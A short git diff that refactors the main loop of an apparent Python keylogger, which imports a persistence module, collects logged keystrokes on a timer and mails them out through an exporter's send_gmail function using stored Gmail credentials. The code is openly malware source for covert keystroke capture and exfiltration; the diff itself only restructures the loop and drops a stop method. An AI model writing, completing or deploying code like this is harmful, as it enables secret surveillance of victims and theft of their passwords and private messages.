@@ -1,5 +1,4 @@
-import sys, os
-import time
+import sys, os, time
 
 from src import persistence
 from src import exporter
@@ -33,8 +32,10 @@ class main:
     def start(self):
         self.keylogger.start()
 
-        while self.keylogger.keylogger_running:
+        while True:
             time.sleep(self.timer)
+
+            if not self.keylogger.keylogger_running: break
 
             key_log = self.keylogger.get_key_log()
 
@@ -44,9 +45,6 @@ class main:
                 else:
                     if exporter.send_gmail(key_log, self.gmail, self.gmail_pass):
                         self.keylogger.clear_key_log()
-
-    def stop(self):
-        self.keylogger.stop_key_logger()
 
 
 if __name__ == "__main__":
